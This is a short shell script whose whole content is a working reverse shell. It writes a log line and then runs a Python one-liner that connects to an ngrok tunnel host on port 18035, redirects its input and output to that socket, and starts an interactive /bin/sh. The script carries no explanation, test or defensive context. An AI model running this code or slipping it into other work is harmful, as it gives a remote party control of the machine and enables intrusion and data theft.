#!/bin/sh
echo "[*] launching reverse shell" >> /tmp/rev.log
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.ngrok.io",18035));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


